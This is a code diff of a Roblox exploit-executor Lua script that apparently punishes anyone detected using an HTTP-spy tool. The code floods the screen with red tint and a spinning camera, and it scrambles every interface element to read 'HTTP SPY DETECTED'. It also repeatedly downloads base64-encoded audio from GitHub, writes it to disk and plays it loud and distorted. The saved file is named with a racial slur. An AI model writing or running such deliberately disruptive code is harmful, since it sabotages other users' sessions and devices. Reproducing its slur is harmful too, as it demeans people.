@@ -15,7 +15,7 @@ local MessageBoxFlags = {
 }
 
 local sounds = {
-    "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213041658.txt",
+	"https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213041658.txt",
     "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043237.txt",
     "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043244.txt",
     "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043330.txt",
@@ -28,38 +28,10 @@ local sounds = {
     "https://raw.githubusercontent.com/intstrnull/depot/refs/heads/main/encoded-20260213043730.txt",
 }
 
-local Sound = Instance.new("Sound",game)
-Sound.Volume = 10
-local dist = Instance.new("DistortionSoundEffect",Sound)
-dist.Level = 0.75
-dist.Enabled = true
-
-local count = 1
-
-task.spawn(function()
-    while task.wait() do
-        local Encoded = game:HttpGet(sounds[count])
-        writefile("nigga.mp3", crypt.base64decode(Encoded))
-        local Retrieved = getcustomasset("nigga.mp3")
-        Sound.SoundId = Retrieved
-        Sound:Play()
-        Sound.Ended:Wait()
-		count += 1
-		if count > #sounds then
-			count = 1
-		end
-    end
-end)
-
 local cc = Instance.new("ColorCorrectionEffect",game:GetService("Lighting"))
 cc.Contrast = 1
 cc.Saturation = 3
 cc.TintColor = Color3.new(1,0,0)
-
-local hui = gethui()
-hui:ClearAllChildren()
-game:GetService("CoreGui"):ClearAllChildren()
-game:GetService("Players").LocalPlayer.PlayerGui:ClearAllChildren()
 
 task.spawn(function()
     while task.wait() do
@@ -69,5 +41,132 @@ task.spawn(function()
 		pcall(function()
 			workspace.CurrentCamera.CFrame *= CFrame.Angles(math.random(0,360),math.random(0,360),math.random(0,360))
 		end)
+    end
+end)
+
+pcall(function()
+	task.spawn(function()
+		while task.wait() do
+			for i,v in game:GetService("CoreGui"):GetDescendants() do
+				task.spawn(function()
+					pcall(function()
+						v.Name = "HTTP SPY DETECTED"
+					end)
+				end)
+				task.spawn(function()
+					pcall(function()
+						v.Text = "HTTP SPY DETECTED"
+					end)
+				end)
+				task.spawn(function()
+					pcall(function()
+						v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
+					end)
+				end)
+				task.spawn(function()
+					pcall(function()
+						v.Rotation = math.random(0,360)
+					end)
+				end)
+				task.spawn(function()
+					pcall(function()
+						v.Visible = true
+					end)
+				end)
+				task.wait()
+			end
+		end
+	end)
+
+	local hui = gethui()
+
+	if hui then
+		task.spawn(function()
+			while task.wait() do
+				for i,v in hui:GetDescendants() do
+					task.spawn(function()
+						pcall(function()
+							v.Name = "HTTP SPY DETECTED"
+						end)
+					end)
+					task.spawn(function()
+						pcall(function()
+							v.Text = "HTTP SPY DETECTED"
+						end)
+					end)
+					task.spawn(function()
+						pcall(function()
+							v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
+						end)
+					end)
+					task.spawn(function()
+						pcall(function()
+							v.Rotation = math.random(0,360)
+						end)
+					end)
+					task.spawn(function()
+						pcall(function()
+							v.Visible = true
+						end)
+					end)
+					task.wait()
+				end
+			end
+		end)
+	end
+
+	task.spawn(function()
+		while task.wait() do
+			for i,v in game:GetService("Players").LocalPlayer.PlayerGui:GetDescendants() do
+				task.spawn(function()
+					pcall(function()
+						v.Name = "HTTP SPY DETECTED"
+					end)
+				end)
+				task.spawn(function()
+					pcall(function()
+						v.Text = "HTTP SPY DETECTED"
+					end)
+				end)
+				task.spawn(function()
+					pcall(function()
+						v.Position = UDim2.fromScale(math.random(-100,100)/100,math.random(-100,100)/100)
+					end)
+				end)
+				task.spawn(function()
+					pcall(function()
+						v.Rotation = math.random(0,360)
+					end)
+				end)
+				task.spawn(function()
+					pcall(function()
+						v.Visible = true
+					end)
+				end)
+				task.wait()
+			end
+		end
+	end)
+end)
+
+task.spawn(function()
+	local count = 1
+    while task.wait() do
+		local Sound = Instance.new("Sound",game)
+		Sound.Volume = 10
+		local dist = Instance.new("DistortionSoundEffect",Sound)
+		dist.Level = 0.75
+		dist.Enabled = true
+        local Encoded = game:HttpGet(sounds[count])
+        writefile("nigga.mp3", crypt.base64decode(Encoded))
+        local Retrieved = getcustomasset("nigga.mp3")
+        Sound.SoundId = Retrieved
+        Sound:Play()
+        Sound.Ended:Wait()
+		Sound:Destroy()
+		count += 1
+		if count > #sounds then
+			count = 1
+		end
     end
 end)
